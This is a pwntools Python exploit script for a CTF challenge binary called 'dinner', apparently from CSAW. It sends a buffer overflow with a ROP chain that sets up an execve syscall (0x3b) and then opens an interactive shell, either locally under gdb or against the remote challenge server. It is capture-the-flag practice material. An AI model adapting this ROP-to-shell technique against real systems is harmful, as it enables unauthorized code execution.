#!/usr/bin/python

from pwn import *
import sys

script='''
break *0x004005fe
'''

def hunt():
    pause()
    #r.sendline(cyclic(0x500,n=8))
    buf = cyclic(56,n=8) 
    buf += p64(0x004005b4) + p64(0x00400698)
    buf += p64(0x004005bd) + p64(0x0)
    buf += p64(0x004005c6) + p64(0x0)
    buf += p64(0x004005cf) + p64(0x3b) 
    buf += p64(0x004005aa) + "\x41" * 8
    r.sendline(buf)
    r.interactive()


if __name__ == '__main__':
    context.clear(arch='amd64')
    context.terminal = ['tmux', 'splitw', '-v']
    binary = "./dinner"

    log.info("For remote: %s remote" % sys.argv[0])
    host, port = "pwn.chal.csaw.io 10104".split()

    if len(sys.argv) > 1:
        r = remote(host, int(port))
        hunt()
    else:
        r = gdb.debug(binary,gdbscript=script, env={"LD_PRELOAD":""})
        hunt()
